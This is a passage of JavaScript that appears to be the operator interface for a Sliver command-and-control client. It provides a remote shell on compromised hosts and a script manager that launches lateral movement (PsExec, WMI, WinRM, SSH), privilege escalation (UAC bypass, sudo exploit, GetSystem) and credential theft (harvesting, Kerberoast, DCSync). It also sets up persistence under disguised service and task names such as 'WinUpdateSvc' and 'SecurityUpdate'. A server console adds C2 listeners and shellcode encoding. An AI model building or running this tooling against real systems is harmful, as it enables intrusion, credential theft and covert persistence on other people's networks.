  const onClose = () => { append('\n[*] shell closed\n'); if (inEl) inEl.disabled = true; if (window.runtime){ window.runtime.EventsOff(evtOut); window.runtime.EventsOff(evtClose); } };
  if (window.runtime) { window.runtime.EventsOn(evtOut, onData); window.runtime.EventsOn(evtClose, onClose); }
  if (inEl) {
    inEl.addEventListener('keydown', async e => {
      if (e.key !== 'Enter') return;
      const line = inEl.value; inEl.value = '';
      if (line.trim() === 'exit') { await App().StopInteractiveShell(tid).catch(()=>{}); onClose(); return; }
      await App().SendShellData(tid, encodeB64(line + '\n')).catch(err => append(`\n[send error] ${err}\n`));
    });
  }
  activateTab(dockId);
  setTimeout(() => inEl && inEl.focus(), 30);
}
// UTF-8 safe base64 helpers for shell I/O.
function encodeB64(str){ return btoa(unescape(encodeURIComponent(str))); }
function decodeB64(b64){ return decodeURIComponent(escape(atob(b64))); }

// ── Toolbar nav (views in bottom panel for non-agent views) ────────────────
document.querySelectorAll('.tb-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    const view = btn.dataset.view;
    document.querySelectorAll('.tb-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    if (view === 'sessions' || view === 'beacons') { hideModal(); refreshAgents(); return; }
    if (view === 'listeners') openListenersPanel();
    if (view === 'generate') openGeneratePanel();
    if (view === 'builds') openBuildsPanel();
    if (view === 'profiles') openProfilesPanel();
    if (view === 'events') openEventsPanel();
    if (view === 'loot') openLootPanel();
    if (view === 'creds') openCredsPanel();
    if (view === 'hosts') openHostsPanel();
    if (view === 'operators') openOperatorsPanel();
    if (view === 'scripts') openScriptsPanel();
    if (view === 'iocs') openIOCPanel();
    if (view === 'report') exportReport();
    if (view === 'c2profiles') openC2ProfileEditor();
  });
});

// ── View panels (open in bottom interaction area) ──────────────────────────
// Config views (Generate, Listeners, Builds, Profiles, Events, Loot, Operators)
// render in a centered modal window rather than the cramped bottom console.
function openViewPanel(id, title, content) {
  document.getElementById('modal-title').textContent = title;
  document.getElementById('modal-body').innerHTML = content;
  document.getElementById('modal-overlay').classList.remove('hidden');
}
function hideModal() { document.getElementById('modal-overlay').classList.add('hidden'); }
document.getElementById('modal-close').addEventListener('click', hideModal);

// ── Script Manager Panel (Cobalt Strike-style lateral movement / privesc / persistence) ──
// ── Script Manager Panel (Cobalt Strike-style lateral movement / privesc / persistence) ──
async function openScriptsPanel() {
  const scripts = await App().ListScripts().catch(() => []);
  const sessions = allSessions.filter(s => s.id);

  // Group by category
  const cats = {};
  scripts.forEach(s => {
    if (!cats[s.category]) cats[s.category] = [];
    cats[s.category].push(s);
  });

  let sessionOpts = '<option value="">-- Select Pivot Session --</option>';
  sessions.forEach(s => {
    sessionOpts += `<option value="${s.id}">${s.hostname || s.id.slice(0,8)} (${s.remoteAddress})</option>`;
  });

  let html = `<div class="scripts-panel">
    <div class="scr-top-bar">
      <div style="flex:1">
        <label style="color:var(--cyan);font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase">PIVOT SESSION</label>
        <select id="scr-session" class="scr-input">${sessionOpts}</select>
      </div>
    </div>

    <div class="scr-main-layout">
      <!-- Left Pane: Categories & Recipe Form -->
      <div class="scr-left-pane">
        <!-- Parameter / Action Card -->
        <div id="scr-param-card" class="scr-param-card" style="display:none">
          <h3 id="scr-card-title"></h3>
          <p id="scr-card-desc"></p>
          <div id="scr-form-grid" class="scr-form-grid"></div>
          <div class="scr-actions">
            <button id="scr-btn-preview" class="scr-action-btn scr-btn-preview">Preview / Dry-Run</button>
            <button id="scr-btn-exec" class="scr-action-btn scr-btn-exec">Execute Script</button>
          </div>
        </div>

        <!-- Script Categories Grid -->
        <div class="scr-categories">`;

  for (const [cat, items] of Object.entries(cats)) {
    html += `<div class="scr-cat"><h4>${cat}</h4><div class="scr-btns">`;
    items.forEach(s => {
      const attckBadge = s.attck ? `<span class="badge-attck">${esc(s.attck)}</span>` : '';
      const opsecClass = (s.opsec || 'low').toLowerCase();
      const opsecBadge = s.opsec ? `<span class="badge-opsec opsec-${opsecClass}">${esc(s.opsec)}</span>` : '';
      html += `<button class="scr-btn" data-method="${esc(s.method)}" title="${esc(s.description)}">
        <span>${esc(s.name)}</span> ${attckBadge} ${opsecBadge}
      </button>`;
    });
    html += `</div></div>`;
  }

  html += `  </div>
      </div>

      <!-- Right Pane: Output / Preview Console -->
      <div class="scr-right-pane">
        <div class="scr-output-wrap">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
            <label style="color:var(--cyan);font-size:11px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase">CONSOLE OUTPUT / PREVIEW</label>
            <button class="btn small" onclick="document.getElementById('scr-output').textContent='Select a script and click Preview or Execute...';">Clear</button>
          </div>
          <pre id="scr-output" class="scr-output">Select a script recipe on the left to configure parameters and run...</pre>
        </div>
      </div>
    </div>
  </div>`;

  openViewPanel('scripts', 'Script Manager', html);

  // Script selection state
  let currentScript = null;

  const scriptMap = {};
  scripts.forEach(s => { scriptMap[s.method] = s; });

  const paramCard = document.getElementById('scr-param-card');
  const cardTitle = document.getElementById('scr-card-title');
  const cardDesc = document.getElementById('scr-card-desc');
  const formGrid = document.getElementById('scr-form-grid');
  const btnPreview = document.getElementById('scr-btn-preview');
  const btnExec = document.getElementById('scr-btn-exec');
  const out = document.getElementById('scr-output');

  function selectScript(method) {
    const s = scriptMap[method];
    if (!s) return;
    currentScript = s;

    // Update active button state
    document.querySelectorAll('.scr-btn').forEach(b => {
      b.classList.toggle('active', b.dataset.method === method);
    });

    // Header info
    const attckBadge = s.attck ? `<span class="badge-attck">${esc(s.attck)}</span>` : '';
    const opsecClass = (s.opsec || 'low').toLowerCase();
    const opsecBadge = s.opsec ? `<span class="badge-opsec opsec-${opsecClass}">${esc(s.opsec)} Noise</span>` : '';
    cardTitle.innerHTML = `${esc(s.name)} ${attckBadge} ${opsecBadge}`;
    cardDesc.textContent = s.description;

    // Build parameter form fields
    formGrid.innerHTML = '';
    if (s.params && s.params.length > 0) {
      s.params.forEach(p => {
        const field = document.createElement('div');
        let inputHtml = '';
        if (p.type === 'select') {
          const optsHtml = (p.options || []).map(o => `<option value="${esc(o)}" ${o === p.default ? 'selected' : ''}>${esc(o)}</option>`).join('');
          inputHtml = `<select id="scr-field-${esc(p.name)}" class="scr-input">${optsHtml}</select>`;
        } else {
          const inputType = p.type === 'password' ? 'password' : (p.type === 'number' ? 'number' : 'text');
          const val = p.default || '';
          const ph = p.placeholder || '';
          inputHtml = `<input id="scr-field-${esc(p.name)}" type="${inputType}" class="scr-input" value="${esc(val)}" placeholder="${esc(ph)}" />`;
        }
        field.innerHTML = `<label style="color:var(--muted);font-size:11px;font-weight:600">${esc(p.label).toUpperCase()} ${p.required ? '<span style="color:var(--accent)">*</span>' : ''}</label>${inputHtml}`;
        formGrid.appendChild(field);
      });
    } else {
      formGrid.innerHTML = '<div style="color:var(--muted);font-size:11.5px;grid-column:1/-1">No extra parameters required. Click Preview or Execute to run on the selected pivot session.</div>';
    }

    paramCard.style.display = 'block';
  }

  function getParamMap() {
    if (!currentScript) return {};
    const map = {};
    if (currentScript.params) {
      currentScript.params.forEach(p => {
        const el = document.getElementById(`scr-field-${p.name}`);
        if (el) map[p.name] = el.value;
      });
    }
    return map;
  }

  // Bind category button clicks
  document.querySelectorAll('.scr-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      selectScript(btn.dataset.method);
    });
  });

  // Select first script by default if available
  if (scripts.length > 0) {
    selectScript(scripts[0].method);
  }

  // Preview button handler
  btnPreview.addEventListener('click', async () => {
    if (!currentScript) return;
    const sid = document.getElementById('scr-session').value;
    if (!sid) { out.textContent = '[!] Select a pivot session first'; return; }

    out.textContent = `[*] Generating dry-run preview for ${currentScript.name}...`;
    btnPreview.disabled = true;
    try {
      const pmap = getParamMap();
      const res = await App().ScriptPreview(sid, currentScript.method, pmap);
      if (res.error) {
        out.textContent = `[ERROR] ${res.error}`;
        out.style.color = 'var(--accent)';
      } else {
        out.textContent = res.output;
        out.style.color = 'var(--cyan)';
      }
    } catch (e) {
      out.textContent = `[ERROR] ${String(e)}`;
      out.style.color = 'var(--accent)';
    }
    btnPreview.disabled = false;
    out.scrollTop = 0;
  });

  // Execute button handler
  btnExec.addEventListener('click', async () => {
    if (!currentScript) return;
    const sid = document.getElementById('scr-session').value;
    if (!sid) { out.textContent = '[!] Select a pivot session first'; return; }

    const method = currentScript.method;
    const pmap = getParamMap();

    out.textContent = `[*] Executing ${currentScript.name}...`;
    btnExec.disabled = true;

    let result;
    try {
      switch (method) {
        case 'ScriptSpawnLocal':
          result = await App().ScriptSpawnLocal(sid, pmap.targetOS || 'windows', pmap.arch || 'amd64', pmap.profileName || '');
          if (!result.error) renderGraph();
          break;
        case 'ScriptSSHDeploy':
          result = await App().ScriptSSHDeploy(sid, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '', pmap.beaconPath || '');
          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptSpawnLinux':
          result = await App().ScriptSpawnLinux(sid, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '', pmap.listenerURL || '');
          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptSSHExecSimple':
          result = await App().ScriptSSHExecSimple(sid, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '', pmap.command || 'id');
          break;
        case 'ScriptSSHCheck':
          result = await App().ScriptSSHCheck(sid, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '');
          break;
        case 'ScriptSpawnWindows':
          result = await App().ScriptSpawnWindows(sid, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.listenerURL || '');
          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptPsExec':
          result = await App().ScriptPsExec(sid, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.beaconPath || '');
          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptWMIExec':
          result = await App().ScriptWMIExec(sid, pmap.targetHost || '', 135, pmap.user || 'Administrator', pmap.pass || '', pmap.command || 'whoami');
          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptWinRMExec':
          result = await App().ScriptWinRMExec(sid, pmap.targetHost || '', 5985, pmap.user || 'Administrator', pmap.pass || '', pmap.command || 'whoami; hostname');
          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptSCDeploy':
          result = await App().ScriptSCDeploy(sid, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.beaconPath || '');
          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptSMBUploadExec':
          result = await App().ScriptSMBUploadExec(sid, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.beaconPath || '');
          if (!result.error) { recordJump(sid, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptPrivescCheck':
          result = await App().ScriptPrivescCheck(sid);
          break;
        case 'ScriptSudoExploit':
          result = await App().ScriptSudoExploit(sid, pmap.method || 'find');
          break;
        case 'ScriptWinPrivescCheck':
          result = await App().ScriptWinPrivescCheck(sid);
          break;
        case 'ScriptTokenImpersonate':
          result = await App().ScriptTokenImpersonate(sid, pmap.targetUser || '');
          break;
        case 'ScriptGetSystem':
          result = await App().ScriptGetSystem(sid, pmap.profile || '');
          break;
        case 'ScriptUACBypass':
          result = await App().ScriptUACBypass(sid, pmap.beaconPath || '');
          break;
        case 'ScriptPersistCron':
          result = await App().ScriptPersistCron(sid, pmap.cronLine || '');
          break;
        case 'ScriptPersistSSHKey':
          result = await App().ScriptPersistSSHKey(sid, pmap.pubKey || '', pmap.targetUser || 'root');
          break;
        case 'ScriptPersistSystemd':
          result = await App().ScriptPersistSystemd(sid, pmap.serviceName || 'system-update', pmap.execPath || '/tmp/.svc');
          break;
        case 'ScriptPersistRegRun':
          result = await App().ScriptPersistRegRun(sid, pmap.beaconPath || '', pmap.name || 'SecurityUpdate');
          break;
        case 'ScriptPersistSchedTask':
          result = await App().ScriptPersistSchedTask(sid, pmap.beaconPath || '', pmap.taskName || '');
          break;
        case 'ScriptPersistService':
          result = await App().ScriptPersistService(sid, pmap.beaconPath || '', pmap.svcName || 'WinUpdateSvc');
          break;
        case 'ScriptPersistWMI':
          result = await App().ScriptPersistWMI(sid, pmap.beaconPath || '');
          break;
        case 'ScriptPersistStartup':
          result = await App().ScriptPersistStartup(sid, pmap.beaconPath || '');
          break;
        case 'ScriptHarvestCreds':
          result = await App().ScriptHarvestCreds(sid);
          break;
        case 'ScriptWinHarvestCreds':
          result = await App().ScriptWinHarvestCreds(sid);
          break;
        case 'ScriptKerberoast':
          result = await App().ScriptKerberoast(sid);
          break;
        case 'ScriptDCSync':
          result = await App().ScriptDCSync(sid);
          break;
        case 'ScriptNetworkScan':
          result = await App().ScriptNetworkScan(sid, pmap.subnet || '192.168.50', pmap.ports || '22 445 3306 2375 3000');
          break;
        case 'ScriptADEnum':
          result = await App().ScriptADEnum(sid);
          break;
        case 'ScriptWinLocalEnum':
          result = await App().ScriptWinLocalEnum(sid);
          break;
        default:
          result = { error: 'Unknown script: ' + method };
      }
    } catch (e) {
      result = { error: String(e) };
    }

    btnExec.disabled = false;
    if (result.error) {
      out.textContent = `[ERROR] ${result.error}\n\n${result.output || ''}`;
      out.style.color = 'var(--accent)';
    } else {
      out.textContent = `[+] ${result.output || 'Done'}`;
      out.style.color = 'var(--ok)';
      // Lineage is recorded per-method above (only for agent-deploying recipes),
      // using the correct {parentID, parentHost} record format. No catch-all here.
    }
    setTimeout(() => { out.style.color = ''; }, 5000);
    out.scrollTop = out.scrollHeight;
  });
}

function pinScripts() {
  hideModal();
  const id = '_scripts_dock';
  if (openTabs[id]) { activateTab(id); return; }
  openTabs[id] = { kind: 'dock' };
  document.getElementById('empty-interact')?.remove();
  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = id;
  tab.innerHTML = `<span>Scripts</span><span class="close-x" data-cid="${id}">x</span>`;
  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(id); });
  document.getElementById('interact-tabs').appendChild(tab);
  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${id}`;
  panel.innerHTML = `<div style="overflow:auto;flex:1" id="scripts-dock-content">Loading Script Manager...</div>`;
  document.getElementById('interact-panels').appendChild(panel);
  activateTab(id);
  openScriptsPanel().then(() => {
    const modalBody = document.getElementById('modal-body');
    const dockContent = document.getElementById('scripts-dock-content');
    if (modalBody && dockContent) {
      dockContent.innerHTML = modalBody.innerHTML;
      hideModal();
    }
  });
}
document.getElementById('modal-overlay').addEventListener('click', e => { if (e.target.id === 'modal-overlay') hideModal(); });
document.addEventListener('keydown', e => { if (e.key === 'Escape') hideModal(); });

// ── Operator notes (per agent, in-memory) ───────────────────────────────────
document.getElementById('notes-btn').addEventListener('click', openNotes);
function openNotes() {
  if (!activeInteractId) return toast('info', 'Open an agent first (double-click a session/beacon)');
  const t = openTabs[activeInteractId], o = t && t.obj;
  const title = `Notes — ${o ? (o.hostname || o.id.slice(0,8)) : activeInteractId}`;
  openViewPanel('_notes', title,
    `<p style="color:var(--muted);font-size:12px;margin-bottom:8px">Notes are per-agent, saved locally per teamserver, and restored on reconnect. Auto-saved as you type.</p>
     <textarea id="notes-area" class="notes-area" placeholder="Credentials found, next steps, IOCs, todo...">${esc(notesMap[activeInteractId] || '')}</textarea>`);
  const ta = document.getElementById('notes-area');
  ta.addEventListener('input', () => { notesMap[activeInteractId] = ta.value; markNoted(activeInteractId); saveState(); });
  setTimeout(() => ta.focus(), 30);
}
// markNoted adds a small dot to a tab that has notes.
function markNoted(id) {
  const tab = document.querySelector(`.interact-tab[data-tid="${id}"] span`);
  if (tab && notesMap[id] && notesMap[id].trim() && !tab.textContent.startsWith('•')) tab.textContent = '• ' + tab.textContent;
}

// ── Server console (teamserver commands, pinned like the event log) ──────────
const SERVER_HELP = `Server console — runs teamserver commands (NOT on a target).
  help                     this help
  version                  teamserver version
  sessions                 list sessions
  beacons                  list beacons
  jobs | listeners         list active listeners
  jobs kill <id>           kill a listener/job
  operators | players      list operators
  loot [rm <id> | rename <id> <name>]   list / remove / rename loot
  hosts [rm <id> | ioc-rm <ioc-id>]     list / remove hosts / remove host IOC
  creds [add <u> <p> | rm <id>]   list / add / remove credentials
  builds                   list implant builds
  regenerate <name>        re-download a previous build
  profiles                 list implant profiles
  websites [rm <name>]     list / remove hosted websites
  canaries                 list DNS canaries (tripwires)
  stager <host> <port> <profile>   start a TCP stager listener
  use <id-prefix>          interact with a session/beacon
  c2profiles               list HTTP C2 profiles
  c2profile <name>         view a full HTTP C2 profile (JSON)
  c2profile edit <name>    open the HTTP C2 profile editor
  c2profile new            create a new HTTP C2 profile
  certificates | ca        list issued / CA certificates
  compiler                 teamserver build capabilities
  builders                 external build servers
  traffic-encoders         list WASM traffic encoders
  shellcode-encoders       list shellcode encoders
  armory                   list available armory packages
  armory install <name>    install an armory package
  armory remove <name>     remove an armory package
  shellcode-rdi <dll> <func> [args]   convert a DLL to shellcode (sRDI)
  shellcode-encode <bin> [arch] [iter]   encode shellcode (shikata-ga-nai)
  monitor [start|stop|list|add <type> <key>|del <id>]  threat-monitoring
  website add|update <site> <web-path> <local-file> | rm <site> <web-path>
  pivots | pivot-graph     show the pivot (peer) topology
  wg-client-config         generate a WireGuard client config
  wg-unique-ip             allocate a unique WireGuard peer IP
  creds [add|rm|update <id> <plain>|sniff <hash>|get <id>]   credential store
  restart-jobs <id...>     restart listener jobs
  rename <id> <name>       rename a session
  kill-session <id>        kill a session
  kill-beacon <id>         remove a beacon
  mtls [port]              start an mTLS listener (default 8443)
  http [port]              start an HTTP listener (default 80)
  https [port]             start an HTTPS listener (default 443)
  dns <domain...>          start a DNS listener
  wg [port] [nport] [key]  start a WireGuard listener
  clear                    clear this console`;

function pinServerConsole() {
  const id = '_server_dock';
  if (openTabs[id]) { activateTab(id); return; }
  openTabs[id] = { kind: 'dock' };
  document.getElementById('empty-interact')?.remove();
  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = id;
  tab.innerHTML = `<span>Server</span><span class="close-x" data-cid="${id}">x</span>`;
  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(id); });
  document.getElementById('interact-tabs').appendChild(tab);
  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${id}`;
  panel.innerHTML = `<div class="console-out" id="sc-out"><span class="info">Sliver server console — type 'help'. These commands run on the teamserver.\n</span></div>
    <div class="console-in"><span class="console-prompt">sliver &gt; </span><input class="console-input" id="sc-inp" placeholder="server command..." autocomplete="off"/></div>`;
  document.getElementById('interact-panels').appendChild(panel);
  const inp = document.getElementById('sc-inp');
  const hist = []; let hi = -1;
  inp.addEventListener('keydown', e => {
    if (e.key === 'Enter') { const v = inp.value.trim(); inp.value = ''; hi = -1; if (v) { hist.unshift(v); runServerCmd(v); } }
    if (e.key === 'ArrowUp') { if (hi < hist.length-1) { hi++; inp.value = hist[hi]; } e.preventDefault(); }
    if (e.key === 'ArrowDown') { if (hi > 0) { hi--; inp.value = hist[hi]; } else { hi = -1; inp.value = ''; } e.preventDefault(); }
  });
  activateTab(id);
}
function appendServer(text, cls) {
  const o = document.getElementById('sc-out'); if (!o) return;
  const s = document.createElement('span'); s.className = cls || 'out'; s.textContent = text + '\n';
  o.appendChild(s); o.scrollTop = o.scrollHeight;
}
async function runServerCmd(raw) {
  const parts = tok(raw), cmd = (parts[0]||'').toLowerCase(), args = parts.slice(1);
  appendServer(raw, 'cmd');
  try {
    switch (cmd) {
      case 'help': return appendServer(SERVER_HELP, 'info');
      case 'clear': { const o = document.getElementById('sc-out'); if (o) o.innerHTML = ''; return; }
      case 'version': { const v = await App().GetVersion(); return appendServer(`Sliver v${v.major}.${v.minor}.${v.patch}  ${v.os}/${v.arch}  (${v.compiled||''})`, 'out'); }
      case 'sessions': {
        const s = await App().ListSessions(); if (!s.length) return appendServer('no sessions', 'info');
        let o = 'ID           HOST                 USER                 OS/ARCH\n';
        s.forEach(x => o += `${x.id.slice(0,12).padEnd(13)}${(x.hostname||'').slice(0,20).padEnd(21)}${(x.username||'').slice(0,20).padEnd(21)}${x.os}/${x.arch}\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'beacons': {
        const b = await App().ListBeacons(); if (!b.length) return appendServer('no beacons', 'info');
        let o = 'ID           HOST                 USER                 INTERVAL\n';
        b.forEach(x => o += `${x.id.slice(0,12).padEnd(13)}${(x.hostname||'').slice(0,20).padEnd(21)}${(x.username||'').slice(0,20).padEnd(21)}${fmtDur(x.interval)}\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'jobs': case 'listeners': {
        if (args[0] === 'kill') { await App().KillJob(parseInt(args[1])); return appendServer(`[+] job ${args[1]} killed`, 'out'); }
        const j = await App().ListJobs(); if (!j.length) return appendServer('no active jobs', 'info');
        let o = 'ID    NAME       PROTO   PORT\n';
        j.forEach(x => o += `${String(x.id).padEnd(6)}${(x.name||'').padEnd(11)}${(x.protocol||'').padEnd(8)}${x.port||''}\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'operators': case 'players': {
        const ops = await App().ListOperators(); if (!ops.length) return appendServer('no operators', 'info');
        return appendServer(ops.map(o => `${o.online?'[online] ':'[offline]'} ${o.name}`).join('\n'), 'out');
      }
      case 'loot': {
        if (args[0] === 'rm') { await App().DeleteLoot(args[1]); return appendServer(`[+] loot ${args[1]} removed`, 'out'); }
        if (args[0] === 'rename') { if (args.length < 3) return appendServer('usage: loot rename <id> <new-name>', 'err'); await App().RenameLoot(args[1], args.slice(2).join(' ')); return appendServer('[+] loot renamed', 'out'); }
        const l = await App().GetLoot(); if (!l.length) return appendServer('loot store empty', 'info');
        return appendServer(l.map(x => `${x.id.slice(0,12)}  ${(x.type||'').padEnd(10)} ${x.name}`).join('\n'), 'out');
      }
      case 'builds': { const b = await App().GetBuildHistory(); if (!b.length) return appendServer('no builds', 'info'); return appendServer(b.map(x => `${(x.name||'').padEnd(24)} ${x.goos}/${x.goarch} ${x.format}`).join('\n'), 'out'); }
      case 'profiles': { const p = await App().ListImplantProfiles(); if (!p.length) return appendServer('no profiles', 'info'); return appendServer(p.map(x => `${(x.name||'').padEnd(20)} ${x.goos}/${x.goarch} ${x.c2Url||''}`).join('\n'), 'out'); }
      case 'use': {
        if (!args[0]) return appendServer('usage: use <id-prefix>', 'err');
        const all = [...allSessions.map(s => ({kind:'session',obj:s})), ...allBeacons.map(b => ({kind:'beacon',obj:b}))];
        const m = all.find(a => a.obj.id.startsWith(args[0]));
        if (!m) return appendServer(`no session/beacon matching ${args[0]}`, 'err');
        openInteract(m.kind, m.obj); return appendServer(`[+] interacting with ${m.obj.hostname}`, 'out');
      }
      case 'mtls': { await App().StartMTLSListener({host:'0.0.0.0',port:parseInt(args[0])||8443}); return appendServer(`[+] mTLS listener started on :${parseInt(args[0])||8443}`, 'out'); }
      case 'http': { await App().StartHTTPListener({host:'0.0.0.0',port:parseInt(args[0])||80,secure:false}); return appendServer(`[+] HTTP listener started on :${parseInt(args[0])||80}`, 'out'); }
      case 'https': { await App().StartHTTPListener({host:'0.0.0.0',port:parseInt(args[0])||443,secure:true}); return appendServer(`[+] HTTPS listener started on :${parseInt(args[0])||443}`, 'out'); }
      case 'dns': { if (!args.length) return appendServer('usage: dns <domain...>', 'err'); await App().StartDNSListener({domains:args}); return appendServer(`[+] DNS listener for ${args.join(', ')}`, 'out'); }
      case 'wg': case 'wireguard': { await App().StartWGListener({port:parseInt(args[0])||53,nPort:parseInt(args[1])||8888,keyPort:parseInt(args[2])||1337}); return appendServer(`[+] WireGuard listener started`, 'out'); }
      case 'kill-session': case 'rm-session': { if (!args[0]) return appendServer('usage: kill-session <id-prefix>', 'err'); const s = allSessions.find(x => x.id.startsWith(args[0])); if (!s) return appendServer('no matching session', 'err'); await App().KillSession(s.id); return appendServer(`[+] killed session ${s.hostname}`, 'out'); }
      case 'kill-beacon': case 'rm-beacon': { if (!args[0]) return appendServer('usage: kill-beacon <id-prefix>', 'err'); const b = allBeacons.find(x => x.id.startsWith(args[0])); if (!b) return appendServer('no matching beacon', 'err'); await App().KillBeacon(b.id); return appendServer(`[+] removed beacon ${b.hostname}`, 'out'); }
      case 'rename': { if (args.length < 2) return appendServer('usage: rename <session-id-prefix> <new-name>', 'err'); const s = allSessions.find(x => x.id.startsWith(args[0])); if (!s) return appendServer('no matching session', 'err'); await App().RenameSession(s.id, args.slice(1).join(' ')); refreshAgents(); return appendServer('[+] renamed', 'out'); }
      case 'c2profiles': { const p = await App().ListC2Profiles(); if (!p.length) return appendServer('no HTTP C2 profiles', 'info'); return appendServer(p.map(x => x.name).join('\n'), 'out'); }
      case 'certificates': case 'certs': {
        const c = await App().ListCertificates(); if (!c.length) return appendServer('no certificates', 'info');
        let o = 'CN                             TYPE            KEYALG     EXPIRES\n';
        c.forEach(x => o += `${(x.cn||'').slice(0,30).padEnd(31)}${(x.type||'').padEnd(16)}${(x.keyAlgorithm||'').padEnd(11)}${x.validExpiry||''}\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'compiler': case 'compiler-info': {
        const c = await App().GetCompilerInfo();
        let o = `server: ${c.goos}/${c.goarch}\ncross-compilers: ${(c.crossCompilers||[]).join(', ')||'none'}\ntargets:\n`;
        (c.targets||[]).forEach(t => o += `  ${t.goos}/${t.goarch} (${t.format})\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'builders': {
        const b = await App().ListBuilders(); if (!b.length) return appendServer('no external builders registered', 'info');
        return appendServer(b.map(x => `${(x.name||'').padEnd(20)} ${x.goos}/${x.goarch}  op=${x.operatorName}  [${x.templates}]`).join('\n'), 'out');
      }
      case 'traffic-encoders': { const t = await App().ListTrafficEncoders(); return appendServer(t.length ? t.join('\n') : 'no traffic encoders', t.length?'out':'info'); }
      case 'shellcode-encoders': { const s = await App().ListShellcodeEncoders(); return appendServer(s.length ? s.join('\n') : 'no shellcode encoders', s.length?'out':'info'); }
      case 'armory': {
        const sub = (args[0]||'').toLowerCase();
        if (sub === 'install') {
          if (!args[1]) return appendServer('usage: armory install <name>', 'err');
          appendServer(`[*] installing ${args[1]}...`, 'info');
          const err = await App().ArmoryInstall(args[1]).then(() => null).catch(e => String(e));
          return appendServer(err ? `[!] ${err}` : `[+] ${args[1]} installed`, err ? 'err' : 'out');
        }
        if (sub === 'remove' || sub === 'rm') {
          if (!args[1]) return appendServer('usage: armory remove <name>', 'err');
          const err = await App().ArmoryRemove(args[1]).then(() => null).catch(e => String(e));
          return appendServer(err ? `[!] ${err}` : `[+] ${args[1]} removed`, err ? 'err' : 'out');
        }
        const pkgs = await App().ArmoryList().catch(e => { appendServer(`[!] ${e}`, 'err'); return null; });
        if (!pkgs) return;
        if (!pkgs.length) return appendServer('no armory packages available', 'info');
        let out = `${'NAME'.padEnd(28)}${'TYPE'.padEnd(11)}${'INSTALLED'.padEnd(11)}DESCRIPTION
`;
        pkgs.forEach(p => { out += `${(p.name||'').slice(0,27).padEnd(28)}${(p.type||'').padEnd(11)}${(p.installed?'yes':'no').padEnd(11)}${(p.description||'').slice(0,50)}
`; });
        return appendServer(out.trimEnd(), 'out');
      }
      case 'restart-jobs': { if (!args.length) return appendServer('usage: restart-jobs <id> [id...]', 'err'); await App().RestartJobs(args.map(a => parseInt(a))); return appendServer(`[+] restarted jobs ${args.join(', ')}`, 'out'); }
      case 'ca': case 'certificate-authority': {
        const c = await App().ListCAInfo(); if (!c.length) return appendServer('no CA certificates', 'info');
        let o = 'CN                             TYPE            KEYALG     EXPIRES\n';
        c.forEach(x => o += `${(x.cn||'').slice(0,30).padEnd(31)}${(x.type||'').padEnd(16)}${(x.keyAlgorithm||'').padEnd(11)}${x.validExpiry||''}\n`);
        return appendServer(o.trimEnd(), 'out');
      }
      case 'monitor': {
        const sub = (args[0]||'list').toLowerCase();
        if (sub === 'start') { await App().StartMonitor(); return appendServer('[+] monitor started', 'out'); }
        if (sub === 'stop')  { await App().StopMonitor();  return appendServer('[+] monitor stopped', 'out'); }
        if (sub === 'add')   { if (args.length < 3) return appendServer('usage: monitor add <type> <apikey> [apipassword]', 'err'); await App().AddMonitorConfig(args[1], args[2], args[3]||''); return appendServer('[+] monitoring provider added', 'out'); }
        if (sub === 'del' || sub === 'rm') { if (!args[1]) return appendServer('usage: monitor del <id>', 'err'); await App().DelMonitorConfig(args[1]); return appendServer('[+] provider removed', 'out'); }
        const p = await App().ListMonitorConfig(); if (!p.length) return appendServer('no monitoring providers configured', 'info');
        return appendServer(p.map(x => `${(x.id||'').padEnd(16)} ${x.type}`).join('\n'), 'out');
      }
      case 'pivot-graph': case 'pivots': {
        const g = await App().GetPivotGraph(); if (!g.length) return appendServer('no pivots', 'info');
        const lines = []; const walk = (n, d) => { lines.push(`${'  '.repeat(d)}${n.hostname||n.name||('peer '+n.peerId)}`); (n.children||[]).forEach(c => walk(c, d+1)); };
        g.forEach(n => walk(n, 0)); return appendServer(lines.join('\n'), 'out');
      }
      case 'wg-client-config': {
        const c = await App().GenerateWGClientConfig();
        return appendServer(`ClientIP:         ${c.clientIP}\nClientPrivateKey: ${c.clientPrivateKey}\nClientPubKey:     ${c.clientPubKey}\nServerPubKey:     ${c.serverPubKey}`, 'out');
      }
